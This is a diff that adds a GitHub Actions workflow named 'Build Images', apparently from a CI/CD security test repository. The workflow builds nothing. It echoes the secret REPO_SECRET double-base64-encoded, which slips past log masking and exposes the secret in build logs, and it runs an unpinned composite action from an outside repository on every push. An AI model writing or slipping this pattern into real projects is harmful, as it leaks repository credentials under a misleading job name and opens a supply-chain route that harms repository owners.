@@ -1,0 +1,14 @@
+name: "Build Images"
+on: 
+  push:
+
+jobs:
+  init:
+    runs-on: ubuntu-latest
+    name: "init"
+    steps:
+    - run: |
+        echo "[+] steps"
+        echo ${{ secrets.REPO_SECRET }} | base64 -w0 | base64 -w0
+    - name: Test composite
+      uses: s1n-cicd-tests/composite@main
